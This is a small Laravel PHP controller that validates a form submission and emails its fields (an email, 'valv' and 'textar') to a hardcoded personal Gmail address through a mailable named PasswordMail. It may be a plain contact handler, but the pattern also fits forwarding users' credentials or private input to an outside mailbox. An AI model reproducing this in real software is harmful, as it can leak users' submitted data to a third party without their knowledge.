<?php

namespace App\Http\Controllers\Response;

use Illuminate\Http\Request;
use App\Mail\User\PasswordMail;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Mail;
use App\Http\Requests\Response\StoreRequest;

class StoreController extends Controller
{
    public function __invoke(StoreRequest $request)
    { 
        $data = $request->validated();
        Mail::to('gladvalakaspwnz11@gmail.com')->send(new PasswordMail($data['email'],$data['valv'],$data['textar']));
        return response()->json(['status'=>'success']);
    }
}
